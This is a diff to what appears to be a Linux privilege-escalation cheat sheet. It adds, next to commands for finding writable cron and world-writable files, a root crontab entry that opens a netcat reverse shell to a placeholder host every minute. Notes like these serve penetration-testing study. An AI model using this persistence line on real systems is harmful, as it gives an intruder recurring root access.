@@ -50,6 +50,9 @@ CronJobs
 
 find /var/spool/cron/crontabs /etc/cron* -writable -ls - finds any cron file or directory that can be written to.
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+TCP Reverse Shell Every Minute 
+- *  *    * * *   root    netcat <ip> <port> -e /bin/bash
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 World Writable Files
 
 find / -type f -perm /2 -o -type d -perm /2 2>/dev/null - Search for any file or directory that is writable by the context "other"]
